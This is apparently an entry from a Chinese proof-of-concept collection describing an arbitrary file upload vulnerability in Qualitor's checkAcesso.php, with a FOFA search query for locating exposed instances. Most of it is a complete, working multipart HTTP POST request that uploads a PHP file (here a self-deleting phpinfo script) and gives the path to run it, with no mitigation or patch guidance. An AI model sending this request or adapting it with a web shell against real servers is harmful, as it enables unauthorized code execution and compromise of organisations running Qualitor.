---
fofa: "app="
source: "wy876 漏洞文库"
---

# Qualitor checkAcesso.php存在任意文件上传漏洞

# 一、漏洞简介
Qualitor checkAcesso.php存在任意文件上传漏洞

# 二、影响版本
+ Qualitor 

# 三、资产测绘
+ fofa`app="Qualitor-Web"`
+ 特征


# 四、漏洞复现
```java
POST /html/ad/adfilestorage/request/checkAcesso.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=---------------------------QUALITORspaceCVEspace2024space44849
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="idtipo"
 
2
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmfilestorage"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmdiretoriorede"
 
.
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmbucket"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmaccesskey"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmkeyid"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="fleArquivo"; filename="info.php"
 
<?php phpinfo();unlink(__FILE__);?>
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="cdfilestorage"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849--
```


```java
/html/ad/adfilestorage/request/info.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yiooigqwix8pxlaz>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
